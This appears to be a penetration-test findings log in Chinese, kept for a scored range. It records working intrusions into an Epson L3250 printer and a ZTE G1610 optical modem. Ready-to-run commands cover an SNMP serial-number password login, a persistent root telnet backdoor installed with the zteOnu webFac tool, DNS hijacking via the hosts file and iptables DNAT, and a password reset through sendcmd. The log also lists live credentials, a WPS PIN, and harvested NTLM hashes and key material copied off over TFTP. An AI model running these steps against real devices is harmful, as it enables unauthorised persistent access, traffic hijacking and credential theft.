## 1. Epson L3250 打印机 192.168.2.59 —— WebConfig 管理员（+10 分）

**漏洞**：CVE-2025-35970（high）
**推理链**：nmap 指纹 Epson 打印机 → SNMP 161/udp 默认团体名 public → `snmpwalk` 读出序列号 → 该系列 WebConfig 初始管理员密码默认=序列号 → curl 直登
**命令与回显**：
```
snmpwalk -v2c -c public 192.168.2.59 | grep -i serial
# → 序列号 XAHY637238

curl -i -s -X POST -d 'session=XAHY637238&dummy=&from=top&trigger=set&access=https' \
     'http://192.168.2.59/PRESENTATION/PSWD'
# → HTTP 200 + Set-Cookie: EPSON_COOKIE_SESSION=session&f6b41852-...
# 带 Cookie 访问 /PRESENTATION/HTML/TOP/INDEX.HTML 出现 "Administrator Logout"（登录成功判据）
# 错误口令对照：返回登录页且不发 Cookie
```
**入口维持**：`https://192.168.2.59`，密码 XAHY637238（除非有人改）
**附加情报**：MAC 64:C6:D2:AC:C7:A0、SSID EPSONACC7A0（WPA2-PSK/AES）、管理页可达固件升级/网络配置
**边界**：机身无打印日志/不存内容；要拿打印内容须网关侧 DNAT 截 9100 明文流

## 2. 中兴 ZXHN G1610 光猫 192.168.2.6 —— 永久 root（+200 分）

**漏洞**：webFac 工厂模式后门（critical，无 CVE 号）
**推理链**：指纹=中兴电信光猫 G1610 → 用户要求不爆破转 CVE 路线 → web_search「中兴光猫 开 telnet」命中开源工具 **zteOnu**（Septrum101/zteOnu）：利用 8080 管理面的 webFac 工厂接口，未授权重置工厂账号→进工厂模式→固化 root telnet
**命令与回显**：
```
# Windows 侧 curl 下载 release（跳板直连 GitHub 超时）→ scp 到跳板 /opt/zteonu/zteOnu
/opt/zteonu/zteOnu --telnet          # 打 192.168.2.6:8080 webFac，固化 telnetd
telnet 192.168.2.6
# login: root  password: Zte521
# $ id → uid=0(root) gid=0(root)
# BusyBox v1.17.2 G1610，Linux 4.19.136 armv7l
```
**入口维持**：telnetd 已写入工厂配置**永久固化**，设备重启自启；framework 自愈机制会在进程被杀后自动拉起 httpd/telnetd（实测 kill cspd 引起网络闪断后自愈）
**附加收获**：
- /proc/net/arp 挖出 6 台休眠终端（nmap 全漏）
- 运行时明文：smbpasswd NTLM、ftp ADMINISTRATOR MD5（未破）、WPS PIN 94229882、SN 4A8314432628D3039
- TFTP 回传全套：db_user_cfg.xml（AES 加密待解）、httpd/cspd/libhardcode.so 二进制、/etc/hardcode 密钥材料（跳板 /tmp/tftpout/）
- SMB //2.6/samba 匿名可写（guest=root，path=/mnt）

## 3. G1610 DNS 劫持实证（+200 分，测毕已回滚）

**漏洞**：无 CVE，root 后的正常能力延伸
**推理链**：得分点 netdev-redirect 要求"实际改变流量走向" → 网关是全网 DNS 之一 → 服务面劫持比包级 DNAT 判定更干净
**命令与回显**：
```
# root shell（telnet 2.6）：
echo '192.168.2.20 poc.hijack.test' >> /var/tmp/hosts; kill -HUP $(pidof dnsmasq)
# 跳板：python3 UDP 查询 192.168.2.6:53
# → poc.hijack.test ancount=1 ip=192.168.2.20 ✅（两次复测一致；正常域名走原链路）

# 包级（证明转发面可改写）：
iptables -t nat -I PREROUTING 1 -i br0 -p udp --dport 53 -j DNAT --to 192.168.2.20:5353
# 计数器命中 1 包/61B
# 清理：删规则 + sed 删 hosts 条目 + HUP dnsmasq，复测劫持消失
```
**教训**：hairpin（client==server）时 DNAT 回包收不到，服务面劫持是更稳的证据

## 4. G1610 网页后台口令重置（运维动作，不计分）

**踩坑复盘（重要）**：
1. 第一次改错表：`sendcmd 1 DB set FTPUser 0 Password 123123`——web 真正校验的是 **DevAuthInfo** 表（6 行账号）；且脚本判"200=成功"误判（那 200 是登录页重绘，真成功是 302+sysauth Cookie）
2. 第二个坑：改库后 uhttpd 内存缓存旧凭据，必须 `kill -9 uhttpd`（framework 自动拉起）才生效
**正确流程**：
```
# telnet root：
sendcmd 1 DB all                     # 找账号表
sendcmd 1 DB set DevAuthInfo 0..5 Pass 123123   # 6 行全改
sendcmd 1 DB set FTPUser 0 Password 123123
sendcmd 1 DB save                    # 持久化
kill -9 uhttpd                       # 让 web 进程重读
# 验证：POST /cgi-bin/luci username=useradmin&psd=123123
# → 302 + Set-Cookie: sysauth=ae90...（成功判据）；错误口令=200 留在登录页
```
**现用入口**：http://192.168.2.6/（80 口）useradmin/123123；telnet root/Zte521

## 5. 排查方法沉淀

- 休眠终端发现：网关 root 看 `/proc/net/arp`（比 nmap -sn 全），MAC 本地管理位（2/6/A/E）= 随机化 MAC 无线客户端
- 跳板免交互 SSH：`SSH_ASKPASS_REQUIRE=force` + askpass 助手（C:\Users\Administrator\.dshwork\rssh.ps1）
- 跳板 GitHub 慢：Windows 侧下载后 scp；nuclei 模板用 ghproxy/gitee 镜像
- arping 回显格式差异：iputils 版本 `bytes from` vs `reply from`，grep 要兼容两者
